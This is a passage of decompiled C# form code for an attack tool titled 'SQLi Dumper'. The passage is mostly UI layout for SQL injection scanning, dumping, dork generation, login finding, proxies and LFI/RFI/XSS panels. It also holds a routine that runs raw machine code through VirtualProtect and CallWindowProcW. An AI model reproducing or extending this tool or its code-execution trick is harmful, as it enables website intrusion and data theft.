		this.btnTextToBase64.TabIndex = 96;
		this.btnTextToBase64.Text = "Text to Base64";
		this.btnTextToBase64.UseVisualStyleBackColor = true;
		this.btnURLDecondingToText.Enabled = false;
		this.btnURLDecondingToText.ForeColor = System.Drawing.SystemColors.ControlText;
		this.btnURLDecondingToText.Location = new System.Drawing.Point(374, 460);
		this.btnURLDecondingToText.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.btnURLDecondingToText.Name = "btnURLDecondingToText";
		this.btnURLDecondingToText.Size = new System.Drawing.Size(195, 34);
		this.btnURLDecondingToText.TabIndex = 95;
		this.btnURLDecondingToText.Text = "URL Dec. to Text";
		this.btnURLDecondingToText.UseVisualStyleBackColor = true;
		this.btnTextToURLEnconding.Enabled = false;
		this.btnTextToURLEnconding.ForeColor = System.Drawing.SystemColors.ControlText;
		this.btnTextToURLEnconding.Location = new System.Drawing.Point(170, 460);
		this.btnTextToURLEnconding.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.btnTextToURLEnconding.Name = "btnTextToURLEnconding";
		this.btnTextToURLEnconding.Size = new System.Drawing.Size(195, 34);
		this.btnTextToURLEnconding.TabIndex = 94;
		this.btnTextToURLEnconding.Text = "Text to URL Enc.";
		this.btnTextToURLEnconding.UseVisualStyleBackColor = true;
		this.txtTextValue.ForeColor = System.Drawing.SystemColors.ControlText;
		this.txtTextValue.Location = new System.Drawing.Point(170, 29);
		this.txtTextValue.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.txtTextValue.Multiline = true;
		this.txtTextValue.Name = "txtTextValue";
		this.txtTextValue.Size = new System.Drawing.Size(398, 139);
		this.txtTextValue.TabIndex = 82;
		this.cmbSQLChar.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.cmbSQLChar.FlatStyle = System.Windows.Forms.FlatStyle.Popup;
		this.cmbSQLChar.FormattingEnabled = true;
		this.cmbSQLChar.Location = new System.Drawing.Point(171, 371);
		this.cmbSQLChar.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.cmbSQLChar.Name = "cmbSQLChar";
		this.cmbSQLChar.Size = new System.Drawing.Size(134, 28);
		this.cmbSQLChar.TabIndex = 93;
		this.butTextToSQLChar.Enabled = false;
		this.butTextToSQLChar.ForeColor = System.Drawing.SystemColors.ControlText;
		this.butTextToSQLChar.Location = new System.Drawing.Point(420, 368);
		this.butTextToSQLChar.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.butTextToSQLChar.Name = "butTextToSQLChar";
		this.butTextToSQLChar.Size = new System.Drawing.Size(150, 34);
		this.butTextToSQLChar.TabIndex = 91;
		this.butTextToSQLChar.Text = "Text to SQL Char";
		this.butTextToSQLChar.UseVisualStyleBackColor = true;
		this.txtSQLCharDelimiter.Enabled = false;
		this.txtSQLCharDelimiter.Location = new System.Drawing.Point(318, 371);
		this.txtSQLCharDelimiter.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.txtSQLCharDelimiter.MaxLength = 5;
		this.txtSQLCharDelimiter.Name = "txtSQLCharDelimiter";
		this.txtSQLCharDelimiter.Size = new System.Drawing.Size(91, 26);
		this.txtSQLCharDelimiter.TabIndex = 92;
		this.txtSQLCharDelimiter.Text = "+";
		this.chkGroupChar.AutoSize = true;
		this.chkGroupChar.CheckAlign = System.Drawing.ContentAlignment.MiddleRight;
		this.chkGroupChar.Checked = true;
		this.chkGroupChar.CheckState = System.Windows.Forms.CheckState.Checked;
		this.chkGroupChar.ForeColor = System.Drawing.SystemColors.ControlText;
		this.chkGroupChar.Location = new System.Drawing.Point(42, 378);
		this.chkGroupChar.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.chkGroupChar.Name = "chkGroupChar";
		this.chkGroupChar.Size = new System.Drawing.Size(118, 24);
		this.chkGroupChar.TabIndex = 87;
		this.chkGroupChar.Text = "Group Char";
		this.chkGroupChar.UseVisualStyleBackColor = true;
		this.btnHexToText.Enabled = false;
		this.btnHexToText.ForeColor = System.Drawing.SystemColors.ControlText;
		this.btnHexToText.Location = new System.Drawing.Point(374, 417);
		this.btnHexToText.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.btnHexToText.Name = "btnHexToText";
		this.btnHexToText.Size = new System.Drawing.Size(195, 34);
		this.btnHexToText.TabIndex = 90;
		this.btnHexToText.Text = "Hex to Text";
		this.btnHexToText.UseVisualStyleBackColor = true;
		this.txtSQLCharValue.ForeColor = System.Drawing.SystemColors.ControlText;
		this.txtSQLCharValue.Location = new System.Drawing.Point(170, 334);
		this.txtSQLCharValue.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.txtSQLCharValue.Name = "txtSQLCharValue";
		this.txtSQLCharValue.Size = new System.Drawing.Size(397, 26);
		this.txtSQLCharValue.TabIndex = 85;
		this.lblToolsConvertHexValue.ForeColor = System.Drawing.SystemColors.ControlText;
		this.lblToolsConvertHexValue.Location = new System.Drawing.Point(21, 182);
		this.lblToolsConvertHexValue.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.lblToolsConvertHexValue.Name = "lblToolsConvertHexValue";
		this.lblToolsConvertHexValue.Size = new System.Drawing.Size(144, 28);
		this.lblToolsConvertHexValue.TabIndex = 86;
		this.lblToolsConvertHexValue.Text = "Hex value";
		this.lblToolsConvertHexValue.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
		this.lblToolsConverSQLChar.ForeColor = System.Drawing.SystemColors.ControlText;
		this.lblToolsConverSQLChar.Location = new System.Drawing.Point(21, 337);
		this.lblToolsConverSQLChar.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.lblToolsConverSQLChar.Name = "lblToolsConverSQLChar";
		this.lblToolsConverSQLChar.Size = new System.Drawing.Size(144, 28);
		this.lblToolsConverSQLChar.TabIndex = 88;
		this.lblToolsConverSQLChar.Text = "SQL char value";
		this.lblToolsConverSQLChar.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
		this.txtHexValue.ForeColor = System.Drawing.SystemColors.ControlText;
		this.txtHexValue.Location = new System.Drawing.Point(170, 182);
		this.txtHexValue.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.txtHexValue.Multiline = true;
		this.txtHexValue.Name = "txtHexValue";
		this.txtHexValue.Size = new System.Drawing.Size(398, 139);
		this.txtHexValue.TabIndex = 84;
		this.lblToolsConvertTextValue.ForeColor = System.Drawing.SystemColors.ControlText;
		this.lblToolsConvertTextValue.Location = new System.Drawing.Point(21, 29);
		this.lblToolsConvertTextValue.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.lblToolsConvertTextValue.Name = "lblToolsConvertTextValue";
		this.lblToolsConvertTextValue.Size = new System.Drawing.Size(144, 28);
		this.lblToolsConvertTextValue.TabIndex = 83;
		this.lblToolsConvertTextValue.Text = "Text value";
		this.lblToolsConvertTextValue.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
		this.btnConvertTextToHex.Enabled = false;
		this.btnConvertTextToHex.ForeColor = System.Drawing.SystemColors.ControlText;
		this.btnConvertTextToHex.Location = new System.Drawing.Point(170, 417);
		this.btnConvertTextToHex.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.btnConvertTextToHex.Name = "btnConvertTextToHex";
		this.btnConvertTextToHex.Size = new System.Drawing.Size(195, 34);
		this.btnConvertTextToHex.TabIndex = 89;
		this.btnConvertTextToHex.Text = "Text to Hex";
		this.btnConvertTextToHex.UseVisualStyleBackColor = true;
		this.grbToolsIP.Controls.Add(this.numPingPort);
		this.grbToolsIP.Controls.Add(this.btnPing);
		this.grbToolsIP.Controls.Add(this.btnResolve);
		this.grbToolsIP.Controls.Add(this.txtResolveCountry);
		this.grbToolsIP.Controls.Add(this.txtResolveIP);
		this.grbToolsIP.Controls.Add(this.picResolveFlag);
		this.grbToolsIP.Controls.Add(this.lblToolsIPAddress);
		this.grbToolsIP.Controls.Add(this.lblToolsIP);
		this.grbToolsIP.Controls.Add(this.lblToolsIPCountry);
		this.grbToolsIP.Controls.Add(this.txtResolveAddress);
		this.grbToolsIP.Controls.Add(this.lblToolsIPport);
		this.grbToolsIP.Location = new System.Drawing.Point(4, 563);
		this.grbToolsIP.Name = "grbToolsIP";
		this.grbToolsIP.Size = new System.Drawing.Size(579, 168);
		this.grbToolsIP.TabIndex = 80;
		this.grbToolsIP.TabStop = false;
		this.grbToolsIP.Text = "IP Pinger/Host to Country";
		this.numPingPort.Location = new System.Drawing.Point(494, 83);
		this.numPingPort.Maximum = new decimal(new int[4] { 1410065407, 2, 0, 0 });
		this.numPingPort.Minimum = new decimal(new int[4] { 1, 0, 0, 0 });
		this.numPingPort.Name = "numPingPort";
		this.numPingPort.Size = new System.Drawing.Size(76, 26);
		this.numPingPort.TabIndex = 78;
		this.numPingPort.TextAlign = System.Windows.Forms.HorizontalAlignment.Right;
		this.numPingPort.Value = new decimal(new int[4] { 80, 0, 0, 0 });
		this.btnPing.Enabled = false;
		this.btnPing.Font = new System.Drawing.Font("Tahoma", 8.25f);
		this.btnPing.Location = new System.Drawing.Point(426, 123);
		this.btnPing.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.btnPing.Name = "btnPing";
		this.btnPing.Size = new System.Drawing.Size(142, 34);
		this.btnPing.TabIndex = 76;
		this.btnPing.Text = "Ping";
		this.btnPing.UseVisualStyleBackColor = true;
		this.btnResolve.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
		this.btnResolve.Font = new System.Drawing.Font("Tahoma", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.btnResolve.ForeColor = System.Drawing.SystemColors.ControlText;
		this.btnResolve.Location = new System.Drawing.Point(170, 123);
		this.btnResolve.Name = "btnResolve";
		this.btnResolve.Size = new System.Drawing.Size(248, 34);
		this.btnResolve.TabIndex = 67;
		this.btnResolve.Text = "&Resolve";
		this.btnResolve.UseVisualStyleBackColor = true;
		this.txtResolveCountry.ForeColor = System.Drawing.SystemColors.ControlText;
		this.txtResolveCountry.Location = new System.Drawing.Point(170, 89);
		this.txtResolveCountry.Name = "txtResolveCountry";
		this.txtResolveCountry.ReadOnly = true;
		this.txtResolveCountry.Size = new System.Drawing.Size(246, 26);
		this.txtResolveCountry.TabIndex = 70;
		this.txtResolveIP.ForeColor = System.Drawing.SystemColors.ControlText;
		this.txtResolveIP.Location = new System.Drawing.Point(170, 55);
		this.txtResolveIP.Name = "txtResolveIP";
		this.txtResolveIP.ReadOnly = true;
		this.txtResolveIP.Size = new System.Drawing.Size(246, 26);
		this.txtResolveIP.TabIndex = 68;
		this.picResolveFlag.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
		this.picResolveFlag.Location = new System.Drawing.Point(114, 122);
		this.picResolveFlag.Name = "picResolveFlag";
		this.picResolveFlag.Size = new System.Drawing.Size(42, 35);
		this.picResolveFlag.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		this.picResolveFlag.TabIndex = 72;
		this.picResolveFlag.TabStop = false;
		this.lblToolsIPAddress.ForeColor = System.Drawing.SystemColors.ControlText;
		this.lblToolsIPAddress.Location = new System.Drawing.Point(33, 25);
		this.lblToolsIPAddress.Name = "lblToolsIPAddress";
		this.lblToolsIPAddress.Size = new System.Drawing.Size(123, 26);
		this.lblToolsIPAddress.TabIndex = 66;
		this.lblToolsIPAddress.Text = "&Address";
		this.lblToolsIPAddress.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
		this.lblToolsIP.ForeColor = System.Drawing.SystemColors.ControlText;
		this.lblToolsIP.Location = new System.Drawing.Point(33, 54);
		this.lblToolsIP.Name = "lblToolsIP";
		this.lblToolsIP.Size = new System.Drawing.Size(123, 26);
		this.lblToolsIP.TabIndex = 69;
		this.lblToolsIP.Text = "&IP";
		this.lblToolsIP.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
		this.lblToolsIPCountry.ForeColor = System.Drawing.SystemColors.ControlText;
		this.lblToolsIPCountry.Location = new System.Drawing.Point(33, 88);
		this.lblToolsIPCountry.Name = "lblToolsIPCountry";
		this.lblToolsIPCountry.Size = new System.Drawing.Size(123, 26);
		this.lblToolsIPCountry.TabIndex = 71;
		this.lblToolsIPCountry.Text = "&Country";
		this.lblToolsIPCountry.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
		this.txtResolveAddress.ForeColor = System.Drawing.SystemColors.ControlText;
		this.txtResolveAddress.Location = new System.Drawing.Point(170, 22);
		this.txtResolveAddress.Name = "txtResolveAddress";
		this.txtResolveAddress.Size = new System.Drawing.Size(398, 26);
		this.txtResolveAddress.TabIndex = 65;
		this.lblToolsIPport.Location = new System.Drawing.Point(435, 86);
		this.lblToolsIPport.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.lblToolsIPport.Name = "lblToolsIPport";
		this.lblToolsIPport.Size = new System.Drawing.Size(51, 26);
		this.lblToolsIPport.TabIndex = 79;
		this.lblToolsIPport.Text = "Port:";
		this.lblToolsIPport.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
		this.pnlStatistics.Controls.Add(this.lvwStatistics);
		this.pnlStatistics.Location = new System.Drawing.Point(2144, 603);
		this.pnlStatistics.Name = "pnlStatistics";
		this.pnlStatistics.Size = new System.Drawing.Size(604, 80);
		this.pnlStatistics.TabIndex = 42;
		this.lvwStatistics.Columns.AddRange(new System.Windows.Forms.ColumnHeader[2] { this.ColumnHeader34, this.ColumnHeader35 });
		this.lvwStatistics.Dock = System.Windows.Forms.DockStyle.Fill;
		this.lvwStatistics.FullRowSelect = true;
		this.lvwStatistics.GridLines = true;
		this.lvwStatistics.HideSelection = false;
		this.lvwStatistics.Location = new System.Drawing.Point(0, 0);
		this.lvwStatistics.Name = "lvwStatistics";
		this.lvwStatistics.Size = new System.Drawing.Size(604, 80);
		this.lvwStatistics.TabIndex = 3;
		this.lvwStatistics.UseCompatibleStateImageBehavior = false;
		this.lvwStatistics.View = System.Windows.Forms.View.Details;
		this.ColumnHeader34.Text = "Description";
		this.ColumnHeader34.Width = 212;
		this.ColumnHeader35.Text = "Value";
		this.ColumnHeader35.Width = 130;
		this.numSearchColumnThreads.BackColor = System.Drawing.SystemColors.Window;
		this.numSearchColumnThreads.Increment = new decimal(new int[4] { 10, 0, 0, 0 });
		this.numSearchColumnThreads.Location = new System.Drawing.Point(2146, 730);
		this.numSearchColumnThreads.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.numSearchColumnThreads.Minimum = new decimal(new int[4] { 1, 0, 0, 0 });
		this.numSearchColumnThreads.Name = "numSearchColumnThreads";
		this.numSearchColumnThreads.Size = new System.Drawing.Size(94, 26);
		this.numSearchColumnThreads.TabIndex = 43;
		this.numSearchColumnThreads.Value = new decimal(new int[4] { 10, 0, 0, 0 });
		this.pnlLoginFinder.Location = new System.Drawing.Point(2144, 559);
		this.pnlLoginFinder.Name = "pnlLoginFinder";
		this.pnlLoginFinder.Size = new System.Drawing.Size(146, 32);
		this.pnlLoginFinder.TabIndex = 44;
		this.bckImport.WorkerReportsProgress = true;
		this.bckImport.WorkerSupportsCancellation = true;
		this.pnlDorkGenerator.Location = new System.Drawing.Point(2296, 516);
		this.pnlDorkGenerator.Name = "pnlDorkGenerator";
		this.pnlDorkGenerator.Size = new System.Drawing.Size(164, 75);
		this.pnlDorkGenerator.TabIndex = 45;
		this.pnlAnalizer.Location = new System.Drawing.Point(2310, 383);
		this.pnlAnalizer.Name = "pnlAnalizer";
		this.pnlAnalizer.Size = new System.Drawing.Size(88, 128);
		this.pnlAnalizer.TabIndex = 46;
		this.pnlTree.Dock = System.Windows.Forms.DockStyle.Left;
		this.pnlTree.Location = new System.Drawing.Point(0, 0);
		this.pnlTree.Name = "pnlTree";
		this.pnlTree.Size = new System.Drawing.Size(250, 979);
		this.pnlTree.TabIndex = 367;
		this.imlTree.ImageStream = (System.Windows.Forms.ImageListStreamer)resources.GetObject("imlTree.ImageStream");
		this.imlTree.TransparentColor = System.Drawing.Color.Black;
		this.imlTree.Images.SetKeyName(0, "SCANNER.bmp");
		this.imlTree.Images.SetKeyName(1, "SQLI.bmp");
		this.imlTree.Images.SetKeyName(2, "SQLIFAILED.bmp");
		this.imlTree.Images.SetKeyName(3, "DUMPER.bmp");
		this.imlTree.Images.SetKeyName(4, "FILECINSLUSAO.bmp");
		this.imlTree.Images.SetKeyName(5, "TRASH.bmp");
		this.imlTree.Images.SetKeyName(6, "PROXIES.bmp");
		this.imlTree.Images.SetKeyName(7, "TOOLS.bmp");
		this.imlTree.Images.SetKeyName(8, "LOGINFINDER.bmp");
		this.imlTree.Images.SetKeyName(9, "NOTEPAD.bmp");
		this.imlTree.Images.SetKeyName(10, "SETTINGS.bmp");
		this.imlTree.Images.SetKeyName(11, "ADVANCED.bmp");
		this.imlTree.Images.SetKeyName(12, "STATISTICS.bmp");
		this.imlTree.Images.SetKeyName(13, "ABOUT.bmp");
		this.imlTree.Images.SetKeyName(14, "HOME.bmp");
		this.imlTree.Images.SetKeyName(15, "TOOLS_CONVERT.bmp");
		this.imlTree.Images.SetKeyName(16, "SETTINGS2.bmp");
		this.twMain.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		this.twMain.Cursor = System.Windows.Forms.Cursors.Default;
		this.twMain.Font = new System.Drawing.Font("Microsoft Sans Serif", 10f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.twMain.FullRowSelect = true;
		this.twMain.HideSelection = false;
		this.twMain.Location = new System.Drawing.Point(2549, 402);
		this.twMain.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.twMain.Name = "twMain";
		this.twMain.Size = new System.Drawing.Size(199, 106);
		this.twMain.TabIndex = 345;
		base.AutoScaleDimensions = new System.Drawing.SizeF(9f, 20f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(2583, 1119);
		base.Controls.Add(this.twMain);
		base.Controls.Add(this.pnlControls);
		base.Controls.Add(this.pnlTree);
		base.Controls.Add(this.pnlSockList);
		base.Controls.Add(this.pnlScanner);
		base.Controls.Add(this.pnlAnalizer);
		base.Controls.Add(this.pnlDorkGenerator);
		base.Controls.Add(this.pnlSQLi);
		base.Controls.Add(this.pnlSettings);
		base.Controls.Add(this.pnlLoginFinder);
		base.Controls.Add(this.numSearchColumnThreads);
		base.Controls.Add(this.pnlStatistics);
		base.Controls.Add(this.pnlSettingsAdvanced);
		base.Controls.Add(this.pnlTools);
		base.Controls.Add(this.pnlSQLiDumper);
		base.Controls.Add(this.pnlSQLiNoInjectable);
		base.Controls.Add(this.tsWorker);
		base.Controls.Add(this.pnlExploiter);
		base.Controls.Add(this.pnlWindows);
		base.Controls.Add(this.pnlTrash);
		base.Controls.Add(this.pnlNotepad);
		base.Controls.Add(this.pnlAbout);
		base.Controls.Add(this.numThreads);
		base.Controls.Add(this.grbHttpLog);
		base.Controls.Add(this.stMain);
		base.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.MinimumSize = new System.Drawing.Size(985, 708);
		base.Name = "MainForm";
		base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
		this.Text = "SQLi Dumper";
		this.stMain.ResumeLayout(false);
		this.stMain.PerformLayout();
		this.mnuListView.ResumeLayout(false);
		this.mnuSocks.ResumeLayout(false);
		this.pnlSockList.ResumeLayout(false);
		this.pnlSockList.PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.dtgSocks).EndInit();
		this.tsSocks.ResumeLayout(false);
		this.tsSocks.PerformLayout();
		this.pnlSettings.ResumeLayout(false);
		this.GroupBox2.ResumeLayout(false);
		this.grbUpdater.ResumeLayout(false);
		this.grbAppSetthings.ResumeLayout(false);
		this.GroupBox4.ResumeLayout(false);
		this.GroupBox4.PerformLayout();
		this.grbExploithing.ResumeLayout(false);
		this.GroupBox1.ResumeLayout(false);
		this.GroupBox1.PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.numExploitingDelay).EndInit();
		((System.ComponentModel.ISupportInitialize)this.numHTTPTimeout).EndInit();
		((System.ComponentModel.ISupportInitialize)this.numHTTPRetry).EndInit();
		((System.ComponentModel.ISupportInitialize)this.numScanningDelay).EndInit();
		this.mnuExcludeUrlWords.ResumeLayout(false);
		this.pnlNotepad.ResumeLayout(false);
		this.pnlNotepad.PerformLayout();
		this.mnuAbout.ResumeLayout(false);
		this.pnlScanner.ResumeLayout(false);
		this.grbScannerURL.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.dtgQueue).EndInit();
		this.tsSearchFilter.ResumeLayout(false);
		this.tsSearchFilter.PerformLayout();
		this.grbDorks.ResumeLayout(false);
		this.grbDorks.PerformLayout();
		this.mnuQueue.ResumeLayout(false);
		this.pnlExploiter.ResumeLayout(false);
		this.pnlExploiter.PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.dtgFileInclusao).EndInit();
		this.tsFileInclusao.ResumeLayout(false);
		this.tsFileInclusao.PerformLayout();
		this.pnlTrash.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.dtgTrash).EndInit();
		this.mnuTrash.ResumeLayout(false);
		this.grbHttpLog.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.lvwHttpLog).EndInit();
		this.mnuHttpLog.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.VisualStyler1).EndInit();
		this.pnlSettingsAdvanced.ResumeLayout(false);
		this.grbXSS.ResumeLayout(false);
		this.mnuPaths.ResumeLayout(false);
		this.grbLfiLinux.ResumeLayout(false);
		this.tabFileInc.ResumeLayout(false);
		this.TabPage6.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.numLFIpathTraversalCount).EndInit();
		this.tpLfiWin.ResumeLayout(false);
		this.grbSQLi.ResumeLayout(false);
		this.tabSQLi.ResumeLayout(false);
		this.TabPage1.ResumeLayout(false);
		this.TabPage1.PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.numAnalizerUnionEnd).EndInit();
		((System.ComponentModel.ISupportInitialize)this.numAnalizerUnionSart).EndInit();
		this.TabPage2.ResumeLayout(false);
		this.TabPage3.ResumeLayout(false);
		this.grbHTTPExploit.ResumeLayout(false);
		this.grbFileIncWAFs.ResumeLayout(false);
		this.grbRFI.ResumeLayout(false);
		this.grbRFI.PerformLayout();
		this.grbScanner.ResumeLayout(false);
		this.tabScanner.ResumeLayout(false);
		this.TabPage4.ResumeLayout(false);
		this.mnuScannerDomain.ResumeLayout(false);
		this.TabPage5.ResumeLayout(false);
		this.TabPage5.PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.numThreads).EndInit();
		this.tsWorker.ResumeLayout(false);
		this.tsWorker.PerformLayout();
		this.pnlSQLi.ResumeLayout(false);
		this.pnlSQLi.PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.dtgSQLi).EndInit();
		this.tsSearchColumn.ResumeLayout(false);
		this.tsSearchColumn.PerformLayout();
		this.tsSQLi.ResumeLayout(false);
		this.tsSQLi.PerformLayout();
		this.mnuSearchColumn.ResumeLayout(false);
		this.pnlSQLiNoInjectable.ResumeLayout(false);
		this.pnlSQLiNoInjectable.PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.dtgSQLiNoInjectable).EndInit();
		this.tsSQLiNoInjectable.ResumeLayout(false);
		this.tsSQLiNoInjectable.PerformLayout();
		this.mnuDownloads.ResumeLayout(false);
		this.pnlTools.ResumeLayout(false);
		this.grbToolsConvertEnc.ResumeLayout(false);
		this.grbToolsConvertEnc.PerformLayout();
		this.grbToolsIP.ResumeLayout(false);
		this.grbToolsIP.PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.numPingPort).EndInit();
		((System.ComponentModel.ISupportInitialize)this.picResolveFlag).EndInit();
		this.pnlStatistics.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.numSearchColumnThreads).EndInit();
		base.ResumeLayout(false);
		base.PerformLayout();
	}

	private void method_0()
	{
	}

	public void smethod_0()
	{
		dictionary_1 = new Dictionary<string, Delegate>();
		dictionary_1.Add("MainForm", new EventHandler(smethod_5));
		dictionary_1.Add("btnStart", new EventHandler(method_10));
		dictionary_1.Add("btnStop", new EventHandler(method_11));
		dictionary_1.Add("btnSearchColumnStart", new EventHandler(method_12));
		dictionary_1.Add("btnSearchColumnStop", new EventHandler(method_13));
		dictionary_1.Add("twMain", new TreeViewEventHandler(smethod_6));
		dictionary_1.Add("BackgroundWorker", new DoWorkEventHandler(method_26));
	}

	public void smethod_1()
	{
		foreach (KeyValuePair<string, Delegate> item in dictionary_1)
		{
			string key = item.Key;
			object objectValue = RuntimeHelpers.GetObjectValue(FindControl(key));
			bool flag;
			if ((flag = true) == objectValue is Button)
			{
				((Button)objectValue).Click += (EventHandler)item.Value;
			}
			else if (flag == objectValue is ToolStripButton)
			{
				((ToolStripButton)objectValue).Click += (EventHandler)item.Value;
			}
			else if (flag == objectValue is TreeViewExt)
			{
				twMain.AfterSelect += (TreeViewEventHandler)item.Value;
			}
			else if (flag == (objectValue == null))
			{
				string left = key;
				if (Operators.CompareString(left, "MainForm", TextCompare: false) == 0)
				{
					base.Load += (EventHandler)item.Value;
				}
				else if (Operators.CompareString(left, "BackgroundWorker", TextCompare: false) == 0)
				{
					bcWorker.DoWork += (DoWorkEventHandler)item.Value;
				}
			}
		}
	}

	protected virtual object FindControl(string Name)
	{
		PropertyInfo property = GetType().GetProperty(Name, BindingFlags.IgnoreCase | BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic);
		if ((object)property != null)
		{
			return RuntimeHelpers.GetObjectValue(property.GetValue(this, null));
		}
		return null;
	}

	public static string smethod_7()
	{
		return smethod_7(65);
	}

	public static string smethod_7(int index)
	{
		return "sqyfJVf/DH1Z7BDrokWvHg==1vP9F+2Oks0J9/MiBEu+lA==uclng";
	}

	[DllImport("user32", CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr CallWindowProcW([In] byte[] byte_0, IntPtr intptr_0, int int_14, [In][Out] byte[] byte_1, IntPtr intptr_1);

	[DllImport("kernel32", CharSet = CharSet.Unicode, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool VirtualProtect([In] byte[] byte_0, IntPtr intptr_0, int int_14, ref int int_15);

	public void smethod_9()
	{
		byte[] array = new byte[8];
		_ = new byte[26]
		{
			85, 137, 229, 87, 139, 125, 16, 106, 1, 88,
			83, 15, 162, 137, 7, 137, 87, 4, 91, 95,
			137, 236, 93, 194, 16, 0
		};
		byte[] array2 = new byte[19]
		{
			83, 72, 199, 192, 1, 0, 0, 0, 15, 162,
			65, 137, 0, 65, 137, 80, 4, 91, 195
		};
		byte[] array3 = array2;
		IntPtr intptr_ = new IntPtr(array3.Length);
		int int_ = default(int);
		if (VirtualProtect(array3, intptr_, 64, ref int_))
		{
		}
		checked
		{
			string text = default(string);
			if (!(CallWindowProcW(intptr_1: new IntPtr(array.Length), byte_0: array3, intptr_0: IntPtr.Zero, int_14: 0, byte_1: array) == IntPtr.Zero))
			{
				text = "X7";
				text = BitConverter.ToUInt32(array, 4).ToString("X8") + BitConverter.ToUInt32(array, 0).ToString("X8") + text;
				int_ = 0;
				StringBuilder stringBuilder = new StringBuilder();
				string text2 = "abc1defg2hi3jk4lm5no6pq7rs8tuv9wx0yz".ToUpper();
				int num = text2.Length - 1;
				char[] array4 = text.ToCharArray();
				foreach (char @string in array4)
				{
					int num2 = (int)Math.Round((double)Strings.Asc(@string) / 3.0);
					unchecked
					{
						num2 = checked(num2 * int_) % num;
						stringBuilder.Append(text2[num2]);
					}
					int_++;
				}
				text = stringBuilder.ToString();
			}
			Versioned.CallByName(this, "dataAvailable", CallType.Set, text);
		}
	}

	internal void method_1(string string_5)
	{
		if (base.InvokeRequired)
		{
			Invoke(new Delegate44(method_1), string_5);
		}
		else
		{
			string_4 = Globals.FormatStr(string_5);
			lblMainStatus.Text = string_5;
		}
	}

	private void smethod_5(object sender, EventArgs e)
	{
		int try0001_dispatch = -1;
		int num = default(int);
		int num2 = default(int);
		int num3 = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					num = 1;
					SuspendLayout();
					goto IL_000a;
				case 1041:
					{
						num2 = num;
						switch ((num3 <= -2) ? 1 : num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0001;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_0017;
						case 4:
							goto IL_0024;
						case 5:
							goto IL_0037;
						case 6:
							goto IL_004a;
						case 7:
							goto IL_006d;
						case 8:
							goto IL_007e;
						case 9:
							goto IL_0085;
						case 10:
							goto IL_008f;
						case 11:
						case 12:
							goto IL_0097;
						case 13:
							goto IL_00a4;
						case 14:
							goto IL_00ac;
						case 15:
							goto IL_00e6;
						case 16:
							goto IL_0100;
						case 17:
							goto IL_0107;
						case 18:
							goto IL_0114;
						case 20:
						case 21:
						case 22:
							goto IL_0122;
						case 23:
							goto IL_0138;
						case 24:
							goto IL_015c;
						case 25:
							goto IL_0165;
						case 26:
							goto IL_0189;
						case 27:
							goto IL_0193;
						case 28:
							goto IL_019d;
						case 30:
							goto IL_01b3;
						case 31:
							goto IL_01bd;
						case 32:
							goto IL_01c7;
						case 33:
							goto IL_01d0;
						case 34:
							goto IL_01dd;
						case 35:
							goto IL_01e6;
						case 29:
						case 36:
